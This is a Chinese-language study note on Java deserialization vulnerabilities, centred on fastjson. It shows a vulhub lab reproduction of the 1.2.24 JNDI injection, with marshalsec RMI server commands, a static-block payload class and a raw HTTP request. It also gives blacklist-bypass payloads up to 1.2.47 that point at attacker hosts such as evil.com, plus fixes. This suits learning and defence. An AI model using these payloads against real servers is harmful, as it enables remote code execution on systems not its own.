# java反序列化学习

## 基础

### 序列化概念

**序列化**：就是内存中的对象写入到IO流中，保存的格式可以是二进制或者文本内容。

**反序列化**：就是IO流还原成对象

对象**写到磁盘、网络、另一个进程**时就自然会用到序列化反序列化这一工具。

原生的java序列化反序列化是字节流和java互相转化。

###### java写入io：

```
public class SerializationTest {

    public static void serialize(Object obj, String fileName) throws IOException {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(fileName))) {
            oos.writeObject(obj);
        }
    }

    public static void main(String[] args) throws IOException {
        Person person = new Person("bb", 22);
        serialize(person, "ser.bin");
        System.out.println("已写入 ser.bin: " + person);
    }
}
```

###### 从 ser.bin 反序列化 {@link Person}

```

public class UnserializeTest {

    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName))) {
            return ois.readObject();
        }
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        Person person = (Person) unserialize("ser.bin");
        System.out.println(person);
    }
}

```

上述是序列、反序列正常的应用。

##### 反序列化安全问题原理：

之所以反序列化会产生安全问题，是因为Java 允许类提供私有的 `readObject(ObjectInputStream ois)`。约定写法是：方法签名固定、`private`，JVM 在反序列化该类的实例时会反射调用它。

因此：一旦服务端对不可信数据做 `ObjectInputStream.readObject()`，攻击者就可以让字节流里出现带恶意 `readObject` 的类，在还原对象的过程中执行任意写在 `readObject` 里的逻辑。这就是你实验 2 的核心。

真实漏洞里往往不是自己写 `UnsafePerson`，库里现成的类包含（gadget chain）危险方法，或者包含其他危险的可控类。

1.入口类的readObject直接调用危险方法。 2.入口类参数中包含可控类，该类有危险方法，readObject时调用。 3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用。 比如类型定义为Object， 调用 Mequals/hashcode/toString 重点 相同类型 同名函数 4.构造函数/静态代码块等类加载时隐式执行。

**反序列化基础利用条件**：

- 继承serializable
- 入口点 source
- 调用链 gadget chain
- 执行类 

可以重写person类的readObject方法来验证:

```java
package com.yuy0ung.fundamentals;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable {
    private String name;
    private int age;
    public Person() {

    }
    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person [name=" + name + ", age=" + age + "]";
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        Runtime.getRuntime().exec("open -a calculator");
    }
}
```

序列化然后反序列化就会弹计算器。

###### java<->json实现其实和io流的转化是相似的，额外i引入了@type的概念（fastjson）：

```java
public class BasicDemo {

    public static void main(String[] args) {
        Person p = new Person("nk7", 20);
        String json1 = JSON.toJSONString(p);
        System.out.println("toJSONString: " + json1);
        //1：将实例 p（类型为 Person）序列化为 JSON 字符串

        String json2 = "{\"user_age\":20,\"user_name\":\"nk7\"}";
        Person p2 = JSON.parseObject(json2, Person.class);
        System.out.println("parseObject:  " + p2.getName() + ", " + p2.getAge());
        //2：此处将json解封装为对象
        Person p3 = new Person("X", 1);
        p3.name = "ClassName";
        p3.age = 99;
        String withType = JSON.toJSONString(p3, SerializerFeature.WriteClassName);
        //此处在1的基础上多传@type，输出时显示com.nk7.demo.BasicDemo$Person，标志着类的位置，在下面一行代码中传出
        System.out.println("WriteClassName: " + withType);
        
    }

    @JSONType(orders = {"user_name", "user_age"})
    public static class Person {
        @JSONField(name = "user_name")
        private String name;
        @JSONField(name = "user_age")
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getiAge() {
            return age;
        }
    }
}
```

```输出
toJSONString: {"user_name":"nk7","user_age":20}
parseObject:  nk7, 20
WriteClassName: {"@type":"com.nk7.demo.BasicDemo$Person","user_name":"ClassName","user_age":99}
```





## fastjson<=1.24-jndi

这个漏洞可以通过vulhub复现，首先先讲解我们用到的工具和payload：

#####  `marshalsec` 

marshalsec 不负责执行恶意逻辑，它只负责 “当有人对我做 JNDI/rmi `lookup` 时，我返回一种会指向远程 HTTP 上某个类的引用；真正执行恶意代码的是受害 JVM 加载并初始化那个类时触发的 Java 语义“TouchFile”，也就是说marshalsec只负责转发。



```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
  "http://192.168.142.132:8089/#LinuxTouch" 9473
```



**这个RMI服务的作用**：

- 监听9473端口
- 当靶机请求`rmi://192.168.142.132:9473/LinuxTouch`时返回一个Reference对象，告诉靶机：去`http://192.168.142.132:8089/`下载`LinuxTouch.class`

含义可以拆成三块：

| 部分                               | 作用                                                         |
| :--------------------------------- | :----------------------------------------------------------- |
| `http://127.0.0.1:8001/#TouchFile` | Codebase + 类名：`#` 前是 恶意类字节码的 HTTP 根；`#` 后是 在 JNDI Reference 里登记的类名（这里是 `TouchFile`）。 |
| 9473                               | LDAP 监听端口；受害进程里 `dataSourceName` 写成 `ldap://攻击机:9473/...` 就会连到这里。 |
| jar 里的 `LDAPRefServer`           | 用内嵌 LDAP 库（如 UnboundID）拦截 LDAP 查询，按固定格式 塞入 `javaCodeBase` / `javaFactory` 等属性，让 受害方 JVM 里的 JNDI 客户端去 按 URL 拉 `.class` 并参与解析。 |

##### `TouchFile.java` 

```
public class TouchFile {
   static {
       try {
            Path p = Paths.get(System.getProperty("java.io.tmpdir"), "fastjson-jndi-poc.txt");
            Files.write(p, "exploited".getBytes(StandardCharsets.UTF_8));
       } catch (Exception ignored) {
       }
    }
}
```

**这个文件是 `marshalsec` 指向的类，也就是被调用的恶意类。**

特点：

- 没有 `main`：它不是给你 `java TouchFile` 跑的，而是给 受害 JVM 通过 JNDI 远程类加载路径调用的。

- 逻辑全在 `static { }` 里，这是 PoC 常见写法——类一旦被初始化，静态块就执行，等价于「类加载进 JVM 并完成初始化时执行一次」。

  

#####  JNDI：InitialContext.lookup

在我们的受害版本中默认开启了：**JdbcRowSetImpl**，这个危险类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。

`JdbcRowSetImpl.connect()` 里会对 `dataSourceName` 做 `lookup`。
`lookup` 返回什么由 名字解析决定：可以是绑定好的业务对象，也可以是 带工厂信息的 `javax.naming.Reference`，由 `NamingManager` / `DirectoryManager` 再去 解析 Reference（加载类、调工厂等）。
marshalsec 就是专门 伪造 LDAP 返回的工具。



##### 开启本地的 python -m http.server 8001

开启这个端口后，构建的

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
  "http://192.168.142.132:8089/#LinuxTouch" 9473
```

才能被传出去，也就是创建端口->构造jndi



##### 发送恶意Payload（发包）

```
POST / HTTP/1.1
Host: 192.168.142.128:8090
Content-Type: application/json
Content-Length: 146

{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://192.168.142.132:9473/LinuxTouch",
    "autoCommit": true
  }
}
```



```
靶机收到请求
↓
FastJSON解析JSON
↓
看到"@type":"com.sun.rowset.JdbcRowSetImpl"
↓
实例化JdbcRowSetImpl
↓
调用setDataSourceName("rmi://192.168.142.132:9473/LinuxTouch")
↓
setAutoCommit(true)触发connect()
↓
connect()发起JNDI查找: rmi://192.168.142.132:9473/LinuxTouch
↓
连接Kali的RMI服务（端口9473）
↓
RMI服务返回Reference: http://192.168.142.132:8089/LinuxTouch.class
↓
靶机下载并加载LinuxTouch.class
↓
执行静态代码块: Runtime.exec("touch /tmp/success")
```



这样目标机器成功存入对应文件，也可以执行其他危险rce操作。

##### 修复

| 修复方式          | 适用版本 | 说明                                                         |
| :---------------- | :------- | :----------------------------------------------------------- |
| 升级到1.2.83+     | 所有版本 | 最彻底的修复，包含完整补丁                                   |
| 开启SafeMode      | ≥1.2.68  | 快速缓解，完全禁用autoType                                   |
| 升级到Fastjson v2 | 新项目   | 代码重构，性能更好但不完全兼容                               |
| 禁用autoType      | 所有版本 | 临时缓解，可能被绕过，后续好几个版本的类似漏洞都是基于绕过autoType |

## fastjson1.24~1.47

官方后续多次修复该漏洞，但在这个版本区间内有多种方法绕过黑白名单，再次利用fastjson1.24的漏洞：

##### fastjson 1.2.25 - 1.2.41 绕过原理

##### `TypeUtils.loadClass()` 的递归处理逻辑

在 `loadClass` 方法中，如果类名以 `L` 开头且以 `;` 结尾，会去掉首尾字符后递归调用；如果以 `[` 开头，会去掉 `[` 后递归调用。

```java
// TypeUtils.loadClass() 简化逻辑
if (className.startsWith("[") && className.endsWith(";")) {
    // 处理数组和L;包裹的情况
    className = className.substring(1, className.length() - 1);
    return loadClass(className, classLoader);
}
```

**方式一：使用 `L` 和 `;` 包裹**
```json
{
  "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
  "dataSourceName": "rmi://127.0.0.1:1099/hello",
  "autoCommit": "true"
}
```

**方式二：使用 `[` 开头**
```json
{
  "@type": "[com.sun.rowset.JdbcRowSetImpl"[{,
  "dataSourceName": "rmi://127.0.0.1:1099/hello",
  "autoCommit": "true"
}
```

##### 必要条件
```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

---

##### fastjson 1.2.42 绕过原理

黑名单变成哈希值 + 单次首尾字符检测

1.2.42 版本对黑名单进行了哈希处理，并对 `L`/`;` 做了单次检测，但 `loadClass` 的递归逻辑仍然存在。

```java
// 检测逻辑：只检查一次首尾
if (className.charAt(0) == 'L' && className.charAt(className.length() - 1) == ';') {
    className = className.substring(1, className.length() - 1);
    // 只去除一次就传给黑名单检测
}
```

###### 双写 `L` 和 `;`

```json
{
  "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
  "dataSourceName": "rmi://127.0.0.1:1099/hello",
  "autoCommit": "true"
}
```

**原理**：检测只去除一层 `L`/`;`，得到 `Lcom.sun.rowset.JdbcRowSetImpl;`，而 `loadClass` 会递归去除，最终得到正常类名。

| 版本          | 绕过方式            | 原理                               |
| ------------- | ------------------- | ---------------------------------- |
| 1.2.25-1.2.41 | `L类名;` 或 `[类名` | loadClass 递归处理首尾特殊字符     |
| 1.2.42        | `LL类名;;`          | 检测只去一层，loadClass 递归去多层 |
| 1.2.43+       | 数组绕过仍可用      | 只修复了 `L`/`;` 双写              |
| 1.2.44+       | 两种绕过均被修复    | 增加首尾字符多重检测               |



## fastjson1.47

到1.47版本，通过字符绕过的方法已经不可行，但引入了一种新的调用方法：

**`Class.forName()`利用Java反射机制，在运行时动态加载`JdbcRowSetImpl`类，将其存入FastJSON缓存。由于反射加载绕过了FastJSON的黑白名单检查，第二次使用时直接从缓存获取，成功实例化并触发JNDI注入，执行任意命令。**

这就是为什么反射机制在FastJSON漏洞中如此关键——它给了攻击者"在运行时决定使用哪个类"的能力，而黑白名单机制恰恰没能覆盖这个路径。

**核心攻击链始终是`JdbcRowSetImpl`**，因为它的`setDataSourceName()`方法会触发JNDI查找，这是最稳定的gadget

```
{
    "a": {
        "@type": "java.lang.Class",     // ← 辅助对象：用于绕过白名单
        "val": "com.sun.rowset.JdbcRowSetImpl"  // ← 把目标类预加载到缓存
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",  // ← 真正触发漏洞的对象（和1.2.24一样！）
        "dataSourceName": "rmi://evil.com:9999/Exploit",
        "autoCommit": true
    }
}
```

### java反射

在fastjson1.47中，接触到了**`Class.forName()`利用Java反射机制，在运行时动态加载`JdbcRowSetImpl`类，将其存入FastJSON缓存。**

所以这边来学习一些java反射的原理。

##### 1.1 什么是反射？

**反射**：在运行时动态获取类的信息并操作对象的能力，而不需要在编译时知道具体类名。

```
// 正常方式：编译时就知道类名
JdbcRowSetImpl rs = new JdbcRowSetImpl();

// 反射方式：运行时才知道类名
String className = "com.sun.rowset.JdbcRowSetImpl";
Class<?> clazz = Class.forName(className);  // 动态加载
Object rs = clazz.newInstance();            // 动态实例化
```



##### 1.2 三种获取Class对象的方式

```
// 方式1：类名.class（编译时确定）
Class<JdbcRowSetImpl> clazz1 = JdbcRowSetImpl.class;

// 方式2：对象.getClass()（运行时确定）
JdbcRowSetImpl rs = new JdbcRowSetImpl();
Class<?> clazz2 = rs.getClass();

// 方式3：Class.forName()（最灵活，完全动态）
String className = "com.sun.rowset.JdbcRowSetImpl";
Class<?> clazz3 = Class.forName(className);  // ← 漏洞利用的关键
```



------

##### Class.forName()

###### 2.1 方法签名

```
// Class类中的静态方法
public static Class<?> forName(String className) throws ClassNotFoundException

// 完整版本（可控制是否初始化）
public static Class<?> forName(String className, boolean initialize, ClassLoader loder)
```

###### 2.2 执行过程

```
Class.forName("com.sun.rowset.JdbcRowSetImpl");
```

### 2.3 关键：类初始化会执行静态代码块

```
// JdbcRowSetImpl类的静态代码块（简化）
public class JdbcRowSetImpl extends BaseRowSet implements RowSet {
    static {
        // 注册JDBC驱动等初始化操作
        // 但不会直接触发JNDI
    }
    
    // 漏洞触发点在实例方法中，不在静态块
    public void setAutoCommit(boolean autoCommit) {
        if (autoCommit) {
            connect();  // ← 这里触发JNDI查找
        }
    }
}
```

**重要**：`Class.forName()`只加载类，**不会调用实例方法**，所以不会直接触发JNDI。但会把类加载到JVM中。



### 3.1 三种实例化方式

```
// 方式1：直接new（编译时确定）
JdbcRowSetImpl rs1 = new JdbcRowSetImpl();

// 方式2：反射 - 无参构造
Class<?> clazz = Class.forName("com.sun.rowset.JdbcRowSetImpl");
JdbcRowSetImpl rs2 = (JdbcRowSetImpl) clazz.newInstance();

// 方式3：反射 - 有参构造
Constructor<?> constructor = clazz.getConstructor(String.class);
JdbcRowSetImpl rs3 = (JdbcRowSetImpl) constructor.newInstance("param");
```

### 3.2 调用方法触发漏洞

```
// 反射实例化后，调用方法
Class<?> clazz = Class.forName("com.sun.rowset.JdbcRowSetImpl");
Object rs = clazz.newInstance();

// 反射调用setDataSourceName
Method setDSN = clazz.getMethod("setDataSourceName", String.class);
setDSN.invoke(rs, "rmi://evil.com:9999/Exploit");

// 反射调用setAutoCommit（触发漏洞！）
Method setAuto = clazz.getMethod("setAutoCommit", boolean.class);
setAuto.invoke(rs, true);  // ← 这里触发connect() → JNDI查找
```

### 4.1 FastJSON的反序列化过程

```
// 当FastJSON解析这个JSON时：
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://evil.com:9999/Exploit",
    "autoCommit": true
}
```

**内部反射调用链**：

```
// FastJSON内部代码（简化）
public class JavaBeanDeserializer {
    public Object deserialize(DefaultJSONParser parser, Type type) {
        // 1. 通过反射加载类
        Class<?> clazz = Class.forName(typeName);  // ← 反射加载
        
        // 2. 反射创建实例
        Object obj = clazz.newInstance();  // ← 反射实例化
        
        // 3. 解析JSON字段，反射调用setter方法
        for (Map.Entry<String, Object> entry : fields.entrySet()) {
            String fieldName = entry.getKey();
            Object fieldValue = entry.getValue();
            
            // 反射获取setter方法
            String setterName = "set" + capitalize(fieldName);
            Method method = clazz.getMethod(setterName, fieldValue.getClass());
            
            // 反射调用setter
            method.invoke(obj, fieldValue);  // ← 这里调用setDataSourceName和setAutoCommit
        }
        
        return obj;
    }
}
```



### 4.2 完整的反射调用时序

```
// FastJSON使用反射执行的等价代码
String className = "com.sun.rowset.JdbcRowSetImpl";

// Step 1: 反射加载类
Class<?> clazz = Class.forName(className);

// Step 2: 反射创建实例
Object instance = clazz.getDeclaredConstructor().newInstance();

// Step 3: 反射调用setDataSourceName
Method method1 = clazz.getMethod("setDataSourceName", String.class);
method1.invoke(instance, "rmi://evil.com:9999/Exploit");

// Step 4: 反射调用setAutoCommit（触发漏洞）
Method method2 = clazz.getMethod("setAutoCommit", boolean.class);
method2.invoke(instance, true);  // ← 内部调用connect() → JNDI查找
```



------

## 五、反射在1.2.47绕过中的作用

### 5.1 第一步：通过java.lang.Class反射加载

```
{
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
}
```



**FastJSON内部处理**：

```
// ClassDeserializer的反序列化逻辑
public class ClassDeserializer implements ObjectDeserializer {
    public Object deserialize(DefaultJSONParser parser, Type type) {
        // 解析val字段值
        String className = parser.parseObject().getString("val");
        
        // 关键：通过反射加载类
        Class<?> clazz = Class.forName(className);  // ← 反射加载
        
        // 存入缓存（绕过关键）
        ParserConfig.getGlobalInstance().putClass(className, clazz);
        
        return clazz;
    }
}
```



### 5.2 为什么这样能绕过？

java

```
// 正常流程（会检查黑白名单）
Class<?> clazz = Class.forName("com.sun.rowset.JdbcRowSetImpl");
// ↓ FastJSON会在checkAutoType中检查黑白名单
// ↓ 发现是危险类 → 抛出异常

// 绕过流程（利用ClassDeserializer）
// 1. 解析java.lang.Class时，白名单允许
// 2. 内部调用Class.forName()，这是JVM原生方法，没有黑白名单检查
// 3. 加载的类被存入FastJSON缓存
// 4. 第二次使用时从缓存获取，跳过检查
```

```
// 1. 加载类
Class<?> clazz = Class.forName("全限定类名");

// 2. 创建实例
Object obj = clazz.newInstance();  // 已弃用，推荐下面方式
Object obj = clazz.getDeclaredConstructor().newInstance();

// 3. 获取方法
Method method = clazz.getMethod("方法名", 参数类型.class);

// 4. 调用方法
method.invoke(对象实例, 参数值);

// 5. 获取字段
Field field = clazz.getField("字段名");
Object value = field.get(对象实例);

// 6. 修改私有字段
field.setAccessible(true);  // 突破private限制
field.set(对象实例, 新值);
```



## 

